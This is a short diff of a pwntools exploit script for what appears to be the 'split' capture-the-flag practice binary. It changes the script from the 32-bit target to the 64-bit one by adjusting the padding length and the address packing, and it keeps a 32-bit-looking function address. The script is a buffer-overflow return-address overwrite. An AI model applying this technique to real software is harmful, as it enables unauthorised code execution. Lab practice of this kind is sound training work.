@@ -1,11 +1,11 @@
 from pwn import *
 
-p = process('./split32')
-junk = "A" * 44
+p = process('./split')
+junk = "A" * 40
 usefulFunction_addr = 0x08048649
 
 p.recvuntil('> ')
-payload = junk + p32(usefulFunction_addr)
+payload = junk + p64(usefulFunction_addr)
 p.sendline(payload)
 #p.recvuntil('Exiting')
 
